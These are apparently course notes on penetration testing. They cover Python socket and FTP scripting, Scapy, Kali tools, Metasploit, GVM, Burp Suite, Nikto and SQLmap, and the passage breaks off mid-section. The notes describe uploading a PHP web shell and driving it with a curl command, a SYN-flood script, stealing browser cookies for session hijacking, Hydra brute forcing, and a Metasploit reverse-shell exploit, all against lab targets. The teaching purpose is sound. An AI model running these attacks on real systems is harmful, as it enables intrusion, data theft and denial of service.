&nbsp;				□ Example: for x in range(1,5): print("Repetition " + str(x)) → runs 1 to 4.

&nbsp;			§ While loops: Repeat until condition fails (not deeply covered in transcript here).

&nbsp;		○ String Functions

&nbsp;			§ Built-in string manipulation:

&nbsp;				□ .upper() → uppercase.

&nbsp;				□ .lower() → lowercase.

&nbsp;				□ .replace(old,new) → replace substrings.

&nbsp;				□ .find(substring) → find position of substring.

&nbsp;			§ Demonstrates Python’s extensive standard library functions.

&nbsp;		○ Practical Relevance for Pen Testing

&nbsp;			§ Network programming (e.g., sockets, requests) is heavily used.

&nbsp;			§ Lists/dictionaries are ideal for managing hosts, credentials, and services.

&nbsp;			§ Conditionals and loops automate repetitive testing tasks.

&nbsp;			§ Strong library support makes Python flexible for security scripting.



Use the System Functions

&nbsp;	• Python can be extended with system and third-party libraries, which allow scripts to interact with the operating system and external commands. Two important libraries for penetration testers and system administrators are os (built-in system calls) and subprocess (running external commands).

&nbsp;	• Key Concepts

&nbsp;		○ OS Library

&nbsp;			§ Purpose: Provides access to operating system–level information and functions.

&nbsp;			§ Example:

&nbsp;				import os

&nbsp;				os.uname()

&nbsp;			§ Returns details about the OS (name, version, release, etc.).

&nbsp;			§ Useful for gathering environment/system details within scripts.

&nbsp;		○ Subprocess Library

&nbsp;			§ Purpose: Runs external system commands directly from Python.

&nbsp;			§ Example Script (sprog.py):

&nbsp;				import subprocess

&nbsp;				

&nbsp;				# Run uname -V and display results

&nbsp;				subprocess.run(\["uname", "-V"])

&nbsp;				

&nbsp;				# Run uname -ORS, capture result, and decode output

&nbsp;				result = subprocess.run(\["uname", "-oRS"], capture\_output=True)

&nbsp;				print(result.stdout.decode())

&nbsp;			§ Allows both execution (displaying results directly) and capturing output for later processing.

&nbsp;			§ Common in penetration testing for automating system enumeration or integrating system tools into larger scripts.

&nbsp;		○ Why These Libraries Matter

&nbsp;			§ They extend Python beyond its core language, bridging into the OS environment.

&nbsp;			§ Enable automation of system tasks like:

&nbsp;				□ Gathering OS metadata.

&nbsp;				□ Running and chaining command-line tools.

&nbsp;				□ Capturing output for analysis.

&nbsp;			§ Reduce the need for reinventing solutions—many tasks can be done by wrapping existing system utilities.

&nbsp;				



Use Networking Functions

&nbsp;	• Python’s socket module provides low-level networking capabilities, allowing penetration testers to write custom tools for banner grabbing, port scanning, and host reconnaissance. While tools like Nmap already exist, building simple scanners in Python helps understand how network communication works and gives flexibility in testing.

&nbsp;	• Key Concepts

&nbsp;		○ The Socket Module

&nbsp;			§ Importing: import socket to access networking functions.

&nbsp;			§ Configuration:

&nbsp;				□ Set defaults like timeout (socket.setdefaulttimeout(1)).

&nbsp;			§ Creating a socket: socket.socket(socket.AF\_INET, socket.SOCK\_STREAM) for TCP.

&nbsp;			§ Basic use case: Connect to a host/port and receive data.

&nbsp;		○ Banner Grabbing (banftp.py)

&nbsp;			§ Connects to a specific service (FTP on port 21).

&nbsp;			§ Example steps:

&nbsp;				□ Import socket.

&nbsp;				□ Set timeout to 1 second.

&nbsp;				□ Connect to 10.0.2.32:21.

&nbsp;				□ Receive up to 1024 bytes (recv(1024)).

&nbsp;				□ Decode and print the banner.

&nbsp;			§ Purpose: Quickly identify services and versions running on a host.

&nbsp;		○ Simple Port Scanner (portscan.py)

&nbsp;			§ Goal: Identify open TCP ports on a host.

&nbsp;			§ Implementation:

&nbsp;				□ Takes IP address as a command-line argument (sys.argv).

&nbsp;				□ Loops through port range 1–1023.

&nbsp;				□ Tries to connect to each port inside a try/except block.

&nbsp;				□ If connection succeeds → prints port as open.

&nbsp;			§ Demonstrates how scanners work under the hood.

&nbsp;			§ Example run: python portscan.py 10.0.2.32.

&nbsp;		○ Why Build Custom Tools?

&nbsp;			§ Learning value: Understand sockets, connections, and service banners.

&nbsp;			§ Flexibility: Customize for unusual cases (e.g., proprietary services).

&nbsp;			§ Simplicity: Useful for quick checks without large tools like Nmap.

&nbsp;			§ Stealth: Custom scripts may bypass defenses tuned to detect standard tools.



Work with Websites

&nbsp;	• Website penetration testing often requires manual interaction beyond automated tools. Python provides libraries to interact with websites, FTP servers, and file uploads, which can be leveraged to detect vulnerabilities and even execute attacks such as remote code execution (RCE).

&nbsp;	• Key Concepts

&nbsp;		○ Retrieving Web Pages

&nbsp;			§ Library used: urllib.

&nbsp;			§ Example script (useurl.py):

&nbsp;				• Send request to open a webpage (index page).

&nbsp;				• Decode and print HTML.

&nbsp;			§ Purpose: Gain direct access to raw page code for analysis.

&nbsp;		○ Interacting with FTP Servers

&nbsp;			§ Library used: ftplib.

&nbsp;			§ Example script (useftp.py):

&nbsp;				• Connect to FTP server with credentials.

&nbsp;				• Change directory to /var/www (web root).

&nbsp;				• List directory contents with .dir().

&nbsp;			§ Observation: Found a DAV webpage with world-write permissions, which signals a potential vulnerability.

&nbsp;		○ Exploiting Writable Web Directories

&nbsp;			§ Attack method: Uploading a malicious PHP web shell.

&nbsp;			§ Example:

&nbsp;				• PHP file (Shelly.php) → executes commands from URL.

&nbsp;				• Python script (webinject.py) → logs in via FTP, switches to vulnerable folder, and uploads Shelly.php using storbinary.

&nbsp;			§ Outcome: Attacker has a backdoor on the webserver.

&nbsp;	• Command Execution via Web Shell

&nbsp;		○ Once uploaded, the PHP shell can be triggered via a browser or curl.

&nbsp;		○ Example with curl:

&nbsp;			curl http://10.0.2.32/DAV/Shelly.php?cmd=ls%20/home%20-l

&nbsp;			§ %20 = URL-encoded space.

&nbsp;			§ Executes ls -l /home remotely and returns results.

&nbsp;		○ Why This Matters

&nbsp;			§ Demonstrates common real-world attack chain:

&nbsp;				• Reconnaissance → Identify web/FTP server.

&nbsp;				• Enumeration → Detect misconfigurations (writable web folders).

&nbsp;				• Exploitation → Upload malicious file.

&nbsp;				• Post-exploitation → Achieve remote code execution.

&nbsp;			§ Highlights importance of file permissions, FTP security, and input sanitization in web environments.



Access SQLite Databases

&nbsp;	• SQLite databases are commonly encountered during penetration testing (e.g., browser storage, mobile apps). Python’s sqlite3 library provides a simple way to automate interaction with SQLite databases for enumeration and data extraction.

&nbsp;	• Key Concepts

&nbsp;		○ Where SQLite Appears

&nbsp;			§ Found in many applications (browsers, mobile devices, local apps).

&nbsp;			§ Example: Google Chrome uses an SQLite database called Cookies to store session cookies.

&nbsp;			§ Pen testers often target these databases to extract sensitive data (sessions, tokens, credentials).

&nbsp;		○ Connecting to SQLite with Python

&nbsp;			§ Library: sqlite3 (built-in to Python).

&nbsp;			§ Steps:

&nbsp;				□ Import sqlite3.

&nbsp;				□ Connect to the database file (e.g., cookies).

&nbsp;				□ Create a cursor and execute SQL queries.

&nbsp;				□ Fetch and display results.

&nbsp;		○ Database Exploration

&nbsp;			§ Step 1 – List Tables (squeal1.py):

&nbsp;				□ Run query against SQLite master config:

&nbsp;				SELECT name FROM sqlite\_master WHERE type='table';

&nbsp;				□ Revealed tables: meta and cookies.

&nbsp;			§ Step 2 – List Columns (squeal2.py):

&nbsp;				□ Select all fields from cookies table to get column metadata.

&nbsp;				□ Identified the structure of stored cookie data.

&nbsp;			§ Step 3 – Extract Data (squeal3.py):

&nbsp;				□ Query specific fields (e.g., host/site name and cookie value).

&nbsp;				□ Print formatted output for readability.

&nbsp;				□ Produces a list of cookies stored by the browser.

&nbsp;		○ Why This Matters for Pentesting

&nbsp;			§ Cookies can contain session tokens, authentication info, and persistent logins.

&nbsp;			§ Extracting them may allow:

&nbsp;				□ Session hijacking (reuse of session IDs).

&nbsp;				□ Bypassing authentication if tokens are still valid.

&nbsp;			§ SQLite analysis provides insight into how applications store sensitive data locally.



Using Scapy to work with packets

&nbsp;	• Scapy is a powerful Python library for crafting and sending raw network packets. It allows penetration testers to build packets at any layer, customize their fields, and send them directly to a target—making it useful for testing, probing, and simulating attacks such as SYN floods.

&nbsp;	• Key Concepts

&nbsp;		○ What Scapy Is

&nbsp;			§ A Python-based packet manipulation tool.

&nbsp;			§ Can be used interactively (as a CLI) or imported as a library inside scripts.

&nbsp;			§ Provides control over network layers (Ethernet, IP, TCP, UDP, ICMP, etc.).

&nbsp;			§ Let's testers create, modify, send, and sniff packets.

&nbsp;		○ Creating Packets

&nbsp;			§ With Scapy, you can:

&nbsp;				□ Define each layer of a packet (e.g., IP, TCP).

&nbsp;				□ Set fields manually (source/destination IP, ports, flags).

&nbsp;			§ Example in transcript: building TCP SYN packets with defined source/destination IPs and ports.

&nbsp;		○ Example: SYN Flood Script (spack.py)

&nbsp;			§ Routine:

&nbsp;				□ Loops across a range of ports on the target.

&nbsp;				□ Creates TCP packets with the SYN flag set.

&nbsp;				□ Sends them rapidly to overwhelm the target.

&nbsp;			§ Demonstrates DoS principles (though a simple, not optimized, flood).

&nbsp;			§ Execution: sudo python spack.py (requires privileges to send raw packets).

&nbsp;		○ Why Scapy Matters

&nbsp;			§ Useful for penetration testers to:

&nbsp;				□ Simulate attacks (e.g., floods, scans).

&nbsp;				□ Probe systems in custom ways (not just default Nmap-style scans).

&nbsp;				□ Test how a target responds to crafted/malformed packets.

&nbsp;			§ Provides deep flexibility compared to pre-built tools.



Leveraging OpenAI for testing

&nbsp;	• AI tools like OpenAI can be integrated into penetration testing workflows to assist with automation, code generation, and intelligence gathering. By programmatically accessing the OpenAI API, testers can dynamically generate scripts, queries, and security insights that complement traditional tools.

&nbsp;	• Key Concepts

&nbsp;		○ Setting Up OpenAI

&nbsp;			§ Requires an OpenAI account and an API key (free to obtain).

&nbsp;			§ Install Python library:

&nbsp;				sudo pip3 install openai

&nbsp;			§ In scripts, import both openai and os libraries.

&nbsp;			§ Authenticate with your API key before making requests.

&nbsp;		○ Writing a Python Script (myai.py)

&nbsp;			§ Steps in the example script:

&nbsp;				□ Import libraries.

&nbsp;				□ Initialize OpenAI with the API key.

&nbsp;				□ Prompt user for input (e.g., a question or task).

&nbsp;				□ Configure query for GPT model (e.g., GPT-3.5 Turbo).

&nbsp;				□ Specify context/role (e.g., “university lecturer”).

&nbsp;				□ Send query and print the AI’s response.

&nbsp;		○ Practical Testing Examples

&nbsp;			§ Code generation:

&nbsp;				□ Asked for a Python port scanner → OpenAI produced script.

&nbsp;				□ Asked for a PowerShell script to enumerate SMB services → OpenAI provided one.

&nbsp;			§ Threat intelligence:

&nbsp;				□ Queried information on APT28 (Fancy Bear/Sofacy).

&nbsp;				□ Received background, aliases, and activity details.

&nbsp;		○ Why This Matters for Pen Testing

&nbsp;			§ Accelerates scripting: Quickly generate working code for common tasks.

&nbsp;			§ Broad coverage: Handles multiple languages (Python, PowerShell, etc.).

&nbsp;			§ Threat research: Can provide summaries of adversaries, mapped to MITRE ATT\&CK.

&nbsp;			§ Flexibility: Answers depend on the specificity of the query—better prompts yield better results.



#### Kali and Metasploit



A Kali Refresher

&nbsp;	• Kali Linux is a specialized penetration testing distribution. Before using it for security testing, testers should refresh themselves on basic configuration, updates, and built-in tools like macchanger and searchsploit. These ensure the environment is prepared, anonymized when needed, and equipped for vulnerability research.

&nbsp;	• Key Concepts

&nbsp;		○ System Configuration in Kali

&nbsp;			§ Settings management:

&nbsp;				□ Adjust power, display, and security settings (e.g., prevent suspend, lock screen on sleep).

&nbsp;			§ Updating \& upgrading:

&nbsp;				□ Always run:

&nbsp;					sudo apt update \&\& sudo apt upgrade

&nbsp;				□ Ensures all tools and system packages are current.

&nbsp;		○ MAC Address Management

&nbsp;			§ MAC address: The unique hardware address of the network card.

&nbsp;			§ Can be spoofed/changed for anonymity during testing.

&nbsp;			§ Tool: macchanger (found under Sniffing \& Spoofing).

&nbsp;			§ Usage example:

&nbsp;				sudo macchanger -A eth0

&nbsp;				□ Randomizes MAC address for the eth0 interface.

&nbsp;			§ Verify changes with ifconfig.

&nbsp;		○ Vulnerability Research with SearchSploit

&nbsp;			§ Tool: searchsploit (under Exploitation Tools).

&nbsp;			§ Connects to Exploit-DB, a database of public exploits.

&nbsp;			§ Basic usage:

&nbsp;				searchsploit smb

&nbsp;				□ Lists vulnerabilities related to SMB protocol.

&nbsp;			§ Can narrow results by adding keywords:

&nbsp;				searchsploit smb windows

&nbsp;			§ Limits output to Microsoft SMB vulnerabilities.

&nbsp;		○ Kali Menus \& Tools

&nbsp;			§ Kali provides categorical menus (e.g., Sniffing \& Spoofing, Exploitation Tools).

&nbsp;			§ Each contains pre-installed tools commonly used in penetration testing.

&nbsp;			§ Familiarity with these menus improves speed and efficiency during engagements.



Fuzzing with Spike

&nbsp;	• Fuzzing is a penetration testing technique where large amounts of unexpected or malformed data are sent to a target to test for vulnerabilities. The tool Spike, included in Kali Linux, can automate fuzzing against network services. This demo uses Spike against the intentionally vulnerable Vulnserver application to trigger crashes.

&nbsp;	• Key Concepts

&nbsp;		○ Vulnserver Setup

&nbsp;			§ Target system: Windows host running Vulnserver.

&nbsp;			§ Port: Listens on 9999.

&nbsp;			§ Verified connection with Netcat (nc 10.0.2.14 9999).

&nbsp;			§ The HELP command shows available commands, including TRUN, which is used for fuzzing.

&nbsp;		○ Spike Action File

&nbsp;			§ Spike uses action files (.spk) to define fuzzing input.

&nbsp;			§ Example (command.spk):

&nbsp;				□ Reads the banner from the server.

&nbsp;				□ Sends TRUN followed by a variable fuzz string.

&nbsp;			§ Syntax:

&nbsp;				s\_string("TRUN ")

&nbsp;				s\_string\_variable("COMMAND")

&nbsp;		○ Running the Fuzzing Test

&nbsp;			§ Command used:

&nbsp;				generic\_send\_tcp 10.0.2.14 9999 command.spk 0 0

&nbsp;			§ Observations:

&nbsp;				□ Initial traffic works (handshake + welcome banner).

&nbsp;				□ After repeated fuzzed TRUN packets, server stops responding (crash).

&nbsp;		○ Analyzing the Crash

&nbsp;			§ Wireshark captures confirm the sequence:

&nbsp;				□ Normal three-way handshake (SYN → SYN/ACK → ACK).

&nbsp;				□ Welcome messages (105-byte packets).

&nbsp;				□ Fuzzed TRUN packets sent repeatedly.

&nbsp;				□ Eventually no response → server crash.

&nbsp;			§ Next step would be to identify the exact fuzz string that caused the crash, which could form the basis for an exploit (e.g., buffer overflow).

&nbsp;		○ Why This Matters

&nbsp;			§ Fuzzing is a powerful technique to find vulnerabilities in services and applications.

&nbsp;			§ Spike provides a simple but effective way to automate malformed input tests.

&nbsp;			§ Identifying crashes is the first stage in exploit development (e.g., turning a crash into code execution).

&nbsp;			§ Vulnserver + Spike is a safe lab environment for learning fuzzing without risking real systems.



Information Gathering with Legion

&nbsp;	• Legion is a penetration testing tool in Kali Linux used for service enumeration, vulnerability analysis, and credential discovery. It automates reconnaissance by scanning hosts, identifying services, and integrating brute force testing (via Hydra) to uncover valid credentials.

&nbsp;	• Key Concepts

&nbsp;		○ Starting Legion

&nbsp;			§ Found in Applications → Vulnerability Analysis in Kali.

&nbsp;			§ Requires root access (default password: kali).

&nbsp;			§ GUI-based tool (maximize the window for easier navigation).

&nbsp;		○ Adding a Target Host

&nbsp;			§ Hosts are added manually to be scanned.

&nbsp;			§ Example: 10.0.2.8 (Metasploitable server).

&nbsp;			§ Selecting “hard assessment” launches a detailed scan.

&nbsp;			§ Progress is shown in the bottom panel, with results appearing in the main panel.

&nbsp;		○ Service Discovery

&nbsp;			§ Legion enumerates open ports and running services.

&nbsp;			§ Example results:

&nbsp;				□ MySQL (Port 3306) → Detected version 5.0.51a.

&nbsp;				□ FTP (Port 21) → Service identified.

&nbsp;				□ Bind shell (Port 1524) → Detected as Metasploitable root shell.

&nbsp;				□ Some ports may be denied (e.g., Port 6000).

&nbsp;		○ Credential Discovery with Hydra Integration

&nbsp;			§ Legion integrates with Hydra to automatically attempt logins.

&nbsp;				□ Example:

&nbsp;					® MySQL service → Hydra found valid login credentials.

&nbsp;					® FTP service → Hydra also retrieved valid credentials.

&nbsp;				□ Shows how Legion goes beyond simple enumeration to provide direct access paths.

&nbsp;		○ Brute Force Testing

&nbsp;			§ The Brute tab allows custom dictionary-based attacks.

&nbsp;			§ Example setup:

&nbsp;				□ Target: 10.0.2.8 on Port 22 (SSH).

&nbsp;				□ Usernames: unix\_users.txt.

&nbsp;				□ Passwords: unix\_passwords.txt.

&nbsp;				□ Hydra runs against the service using the supplied lists.



Using Metasploit

&nbsp;	• Metasploit is a powerful exploitation framework that allows penetration testers to demonstrate whether vulnerabilities are actually exploitable. It provides a large collection of exploits, payloads, and auxiliary modules, enabling both reconnaissance and post-exploitation activities. This transcript walks through using Metasploit to exploit a service on a target system and establish a remote shell.

&nbsp;	• Key Concepts

&nbsp;		○ Metasploit Overview

&nbsp;			§ Found in Kali → Applications → Exploitation Tools.

&nbsp;			§ On first startup, initializes its database.

&nbsp;			§ Provides:

&nbsp;				□ 2000+ exploits

&nbsp;				□ 1000+ auxiliary modules

&nbsp;				□ 363 post-exploitation tools

&nbsp;				□ 592 payloads

&nbsp;			§ Components:

&nbsp;				□ Exploits → Code used to take advantage of vulnerabilities.

&nbsp;				□ Auxiliary modules → Information gathering, scanning, brute force, etc.

&nbsp;				□ Payloads → Code executed on the target after exploitation (e.g., reverse shell).

&nbsp;				□ Post-exploitation tools → Actions taken after a compromise (e.g., persistence, privilege escalation).

&nbsp;		○ Basic Commands

&nbsp;			§ help → Lists all Metasploit commands.

&nbsp;			§ show exploits → Displays available exploits.

&nbsp;			§ search <term> → Filters results by keyword (e.g., search win8, search irc).

&nbsp;			§ use <exploit> → Loads a selected exploit.

&nbsp;			§ show targets → Lists supported target types.

&nbsp;			§ show payloads → Displays compatible payloads.

&nbsp;			§ info <payload> → Provides detailed information.

&nbsp;			§ set <option> → Configures exploit/payload parameters (e.g., set RHOSTS).

&nbsp;			§ show options → Shows required parameters.

&nbsp;			§ exploit → Executes the attack.

&nbsp;		○ Exploit Demonstration (Metasploitable Server)

&nbsp;			§ Target Service: IRC (UnrealIRCd backdoor).

&nbsp;			§ Exploit used:

&nbsp;				exploit/unix/irc/unreal\_ircd\_3281\_backdoor

&nbsp;			§ Payload selected:

&nbsp;				cmd/unix/reverse

&nbsp;				□ Creates a reverse shell on port 4444.

&nbsp;				□ Does not require admin privileges.

&nbsp;			§ Steps executed:

&nbsp;				□ use exploit/unix/irc/unreal\_ircd\_3281\_backdoor

&nbsp;				□ set target 0 (automatic detection)

&nbsp;				□ show payloads → choose reverse shell

&nbsp;				□ set payload cmd/unix/reverse

&nbsp;				□ set RHOSTS 10.0.2.8 (target IP)

&nbsp;				□ set LHOST 10.0.2.18 (attacker’s Kali IP)

&nbsp;				□ exploit

&nbsp;			§ Result:

&nbsp;				□ Exploit succeeded.

&nbsp;				□ Reverse shell established on remote system.

&nbsp;				□ Verified remote access by:

&nbsp;					® Running ifconfig (saw remote IP 10.0.2.8).

&nbsp;					® Running whoami (root access confirmed).

&nbsp;					® Running ps (list processes).

&nbsp;					® Running ls (list files).

&nbsp;		○ Why Metasploit is Important

&nbsp;			§ Evidence of exploitation: Goes beyond theoretical vulnerabilities to actual proof of compromise.

&nbsp;			§ Rapid exploitation: Provides pre-built, tested modules.

&nbsp;			§ Flexibility: Exploits, payloads, auxiliary modules, and post-exploitation tools can be combined.

&nbsp;			§ Education \& training: Ideal for learning exploitation techniques in labs (e.g., Metasploitable).



Scan Target with GVM

&nbsp;	• The Greenbone Vulnerability Manager (GVM) is a vulnerability scanning tool available in Kali Linux. It helps penetration testers and security professionals identify known vulnerabilities on target systems, generate detailed reports, and provide references for remediation.

&nbsp;	• Key Concepts

&nbsp;		○ Setup and Installation

&nbsp;			§ Install with:

&nbsp;				sudo apt install gvm

&nbsp;			§ Initialize with:

&nbsp;				sudo gvm-setup

&nbsp;				□ Prepares databases and generates an admin password for login.

&nbsp;			§ Requires additional system resources: at least 4 GB RAM recommended (instead of Kali’s default 2 GB).

&nbsp;			§ Start service:

&nbsp;				gvm-start

&nbsp;			§ Login via web interface with provided credentials.

&nbsp;		○ Database and Feed Updates

&nbsp;			§ GVM relies on vulnerability feeds (similar to signature databases).

&nbsp;			§ Updates can take hours to complete.

&nbsp;			§ Must be fully synced before running scans to ensure the latest vulnerability data is used.

&nbsp;		○ Running a Scan

&nbsp;			§ Access via the Scans tab → Wizard.

&nbsp;			§ Example target: Metasploitable server at 10.0.2.32.

&nbsp;			§ Scan workflow:

&nbsp;				□ Starts as Requested → Queued → Running.

&nbsp;				□ Produces a detailed report once complete.

&nbsp;		○ Scan Results and Reporting

&nbsp;			§ Results ranked by severity rating.

&nbsp;			§ Example findings:

&nbsp;				□ Multiple Ruby remote code execution vulnerabilities (port 8787).

&nbsp;				□ TWiki command execution (port 80).

&nbsp;				□ Ingreslock backdoor (port 1524, root shell access).

&nbsp;			§ Reports link directly to CVEs for reference (e.g., 35 CVEs identified).

&nbsp;			§ Detailed entries show:

&nbsp;				□ Description of issue.

&nbsp;				□ Evidence from detection results (e.g., UID=0 response proving root access).

&nbsp;				□ Recommended remediation (e.g., system clean for backdoor).

&nbsp;		○ Why GVM is Important

&nbsp;			§ Provides a broad vulnerability assessment of target systems.

&nbsp;			§ Produces structured reports that map issues to CVEs.

&nbsp;			§ Identifies critical weaknesses (like backdoors and RCEs) that may be directly exploitable.

&nbsp;			§ Helps pen testers prioritize follow-up exploitation testing.



#### Web Testing



Approach Web Testing

&nbsp;	• Web applications are now the backbone of modern services, making web application testing a critical penetration testing skill. The transcript emphasizes different approaches, attack surfaces, and areas of weakness that testers should investigate to prevent breaches.

&nbsp;	• Key Concepts

&nbsp;		○ Why Web Testing Matters

&nbsp;			§ Most applications are delivered as web apps or mobile apps with web backends.

&nbsp;			§ Real-world breaches (e.g., TalkTalk) highlight the severe consequences of insecure websites.

&nbsp;			§ Early testing is more effective and cheaper than reacting after a hack.

&nbsp;		○ Testing Approaches

&nbsp;			§ Crawling:

&nbsp;				□ Automatically enumerates all web pages.

&nbsp;				□ Builds a map of potential attack surfaces.

&nbsp;			§ Intercepting traffic with a proxy:

&nbsp;				□ Observes and manipulates traffic between client and server.

&nbsp;				□ Helps uncover hidden vulnerabilities beyond static crawling.

&nbsp;			§ Manual checks:

&nbsp;				□ Comments in code (may expose credentials or dev notes).

&nbsp;				□ Reviewing client-side code for weaknesses (e.g., JavaScript security gaps).

&nbsp;		○ Key Areas to Investigate

&nbsp;			§ Server \& technology stack:

&nbsp;				□ Identify server software, frameworks, and protocols.

&nbsp;				□ Check for unpatched vulnerabilities and cryptographic weaknesses.

&nbsp;			§ Transport security:

&nbsp;				□ Websites should use HTTPS, but many still rely on HTTP or weak HTTPS.

&nbsp;				□ WebSockets introduce new risks—must be reviewed carefully.

&nbsp;			§ Authentication mechanisms:

&nbsp;				□ Payment gateway integrations (PCI compliance).

&nbsp;				□ Backend authentication servers vulnerable to injection attacks.

&nbsp;				□ Password reset functionality often less robustly tested.

&nbsp;				□ Risks from default or hardcoded credentials.

&nbsp;			§ Session management:

&nbsp;				□ Session hijacking or cookie theft.

&nbsp;				□ Predictable session tokens that attackers can pre-compute.

&nbsp;		○ Common Web Vulnerabilities

&nbsp;			§ Injection attacks (SQL, LDAP, etc.) via poorly validated queries.

&nbsp;			§ Man-in-the-middle risks from insecure transport.

&nbsp;			§ Session hijacking through predictable or stolen cookies.

&nbsp;			§ Remote code execution from misconfigured servers or frameworks.

&nbsp;			§ Information leakage from developer comments or client-side code.



Test Websites with Burp Suite

&nbsp;	• Burp Suite is a widely used web application testing tool that enables penetration testers to intercept, inspect, and manipulate HTTP/S traffic between a browser and a web server. The Community Edition (included in Kali Linux) is sufficient for learning and basic testing, while the professional version is used for full-scale customer assessments.

&nbsp;	• Key Concepts

&nbsp;		○ Burp Suite Basics

&nbsp;			§ Found in Kali → Applications → Web Application Analysis → Burp Suite.

&nbsp;			§ Community Edition:

&nbsp;				□ Only allows temporary projects.

&nbsp;				□ Professional edition allows persistent storage of projects.

&nbsp;			§ Menu provides core functions: Burp, Project, Intruder, Repeater, Window, Help.

&nbsp;			§ Activity tabs include: Dashboard, Target, Proxy, Intruder, Repeater, etc.

&nbsp;		○ Target Tab

&nbsp;			§ Site Map: Displays structure of the web application (URLs, directories, pages).

&nbsp;			§ Scope: Defines which sites/URLs are in-scope for testing.

&nbsp;			§ Issue Definitions: Lists potential vulnerabilities Burp can identify, with severity ratings.

&nbsp;		○ Proxy Functionality

&nbsp;			§ Intercept mode:

&nbsp;				□ Captures traffic between browser and server.

&nbsp;				□ Allows testers to pause, inspect, and modify requests before forwarding them.

&nbsp;			§ By default, Burp listens on localhost:8080.

&nbsp;			§ Browser must be configured to route traffic through this proxy:

&nbsp;				□ Proxy: 127.0.0.1

&nbsp;				□ Port: 8080

&nbsp;		○ Testing Example

&nbsp;			§ Test site: http://zero.webappsecurity.com (a sample vulnerable banking app).

&nbsp;			§ Logged in with test credentials: username / password.

&nbsp;			§ Burp captured traffic, showing:

&nbsp;				□ Requests and responses (raw format or rendered view).

&nbsp;				□ Full site map, including directories and pages.

&nbsp;			§ Allows deeper inspection of session data, authentication flows, and vulnerabilities.

&nbsp;		○ Why Burp Suite is Important

&nbsp;			§ Central tool for web application penetration testing.

&nbsp;			§ Facilitates:

&nbsp;				□ Mapping web applications (structure, endpoints, parameters).

&nbsp;				□ Inspecting \& altering requests/responses.

&nbsp;				□ Identifying vulnerabilities (e.g., injection flaws, weak authentication, misconfigurations).

&nbsp;			§ Integrates manual and automated approaches for thorough testing.



Check Web Servers with Nikto

&nbsp;	• Nikto is a lightweight, command-line web server scanner used to identify vulnerabilities, misconfigurations, and outdated software. It is a common tool for quick reconnaissance of web servers in penetration testing.

&nbsp;	• Key Concept

&nbsp;		○ Purpose of Nikto

&nbsp;			§ Designed to check web servers for:

&nbsp;				□ Known vulnerabilities

&nbsp;				□ Configuration issues

&nbsp;				□ Outdated software

&nbsp;			§ Helps pen testers quickly determine areas needing deeper investigation.

&nbsp;		○ Running Nikto

&nbsp;			§ Found under Kali → Applications → Vulnerability Analysis.

&nbsp;			§ Example command:

&nbsp;				nikto -h 10.0.2.8

&nbsp;				□ -h specifies the host to scan.

&nbsp;		○ Output \& Findings

&nbsp;			§ Example target: Metasploitable host.

&nbsp;			§ Detected:

&nbsp;				□ Apache 2.2.8 on Ubuntu.

&nbsp;				□ Missing hardening features (security best practices not enabled).

&nbsp;				□ Outdated Apache version → potential vulnerabilities.

&nbsp;			§ Found several issues linked to the Open Source Vulnerability Database (OSVDB).

&nbsp;			§ Final summary: 27 items flagged for attention.

&nbsp;		○ Strengths of Nikto

&nbsp;			§ Quick, easy-to-use scanner.

&nbsp;			§ Provides immediate visibility into server misconfigurations and outdated software.

&nbsp;			§ Maps findings to known vulnerability databases for reference.

&nbsp;		○ Limitations

&nbsp;			§ Focuses on server-side vulnerabilities (not full web app testing).

&nbsp;			§ Results often require further manual validation.

&nbsp;			§ May generate many false positives.

&nbsp;			§ Lacks stealth → easily detectable by intrusion detection systems.



Fingerprint Web Servers

&nbsp;	• Fingerprinting web servers is an important early step in web application testing. It helps identify the type and version of the underlying web server even when banners are missing or altered. Different tools can be used to infer server details, but results are often approximate rather than exact.

&nbsp;	• Key Concepts

&nbsp;		○ Why Fingerprinting Matters

&nbsp;			§ Web application security depends not just on the app itself but also on the environment it runs in.

&nbsp;			§ Attackers often exploit weaknesses in outdated or misconfigured web servers.

&nbsp;			§ Server banners may be present, removed, or spoofed; fingerprinting provides alternate ways of deducing server type/version.

&nbsp;		○ Tools for Web Server Fingerprinting

&nbsp;			§ Httprecon

&nbsp;				□ Windows-based tool (downloaded from Computec).

&nbsp;				□ Requires OCX components registered in SysWOW64.

&nbsp;				□ Produces:

&nbsp;					® Match List → ranked server guesses with confidence levels.

&nbsp;					® Fingerprint Details → summary fingerprint.

&nbsp;					® Report Preview → detailed analysis.

&nbsp;				□ Example: Detected Apache 2.0.59 with 100% confidence, though the banner indicated 2.2.8.

&nbsp;			§ Httprint

&nbsp;				□ Downloadable tool from Net Square, GUI-based.

&nbsp;				□ Needs disabling of ICMP and SSL auto-detect for accuracy.

&nbsp;				□ Outputs results in HTML format.

&nbsp;				□ Example:

&nbsp;					® On zero.webappsecurity.com: Deduced Apache 1.3 with 61% confidence.

&nbsp;					® On Metasploitable: Banner reported Apache 2.2.8, deduced 2.0.x with 57% confidence.

&nbsp;			§ Uniscan

&nbsp;				□ Comes pre-installed in Kali Linux.

&nbsp;				□ Run with:

&nbsp;					uniscan -u <target>

&nbsp;				□ Example:

&nbsp;					® Detected WEBrick Ruby server on Hacme Casino site.

&nbsp;					® Detected Apache Coyote 1.1 on the Zero Bank site.

&nbsp;		○ Observations

&nbsp;			§ Fingerprinting results often vary and may conflict with banners.

&nbsp;			§ Provides useful hints for further testing but should not be relied on as absolute truth.

&nbsp;			§ Helps narrow down which vulnerabilities are most relevant to the environment.



Web Server Penetration using SQLmap

&nbsp;	• How to use SQLmap, an automated SQL injection tool, to identify and exploit vulnerabilities in a web server’s login form. By leveraging SQLmap, a tester can move from reconnaissance to full exploitation, including dumping databases and cracking password hashes.

&nbsp;	• Key Concepts

&nbsp;		○ Reconnaissance with Nmap

&nbsp;			§ Target: Europa server (10.10.10.22) in a lab environment.

&nbsp;			§ Scan:

&nbsp;				nmap -PS -F -A 10.10.10.22

&nbsp;			§ Findings:

&nbsp;				□ Open ports → 22 (SSH), 80 (HTTP), 443 (HTTPS).

&nbsp;				□ Web service: Apache 2.4.18.

&nbsp;				□ SSL certificate showed domains:

&nbsp;					® europacorp.htb

&nbsp;					® www.europacorp.htb

&nbsp;					® admin-portal.europacorp.htb

&nbsp;			§ This indicated the presence of virtual hosts / name-based virtual hosting.

&nbsp;		○ Discovering the Web Application

&nbsp;			§ Default Apache page appeared on http://10.10.10.22 and https://10.10.10.22.

&nbsp;			§ Added admin-portal.europacorp.htb to /etc/hosts.

&nbsp;			§ Result: A login page was discovered — potential injection point.

&nbsp;		○ SQLmap Usage

&nbsp;			§ SQLmap command:

&nbsp;				sqlmap -u https://admin-portal.europacorp.htb --forms --crawl=2 --threads=10 --dump

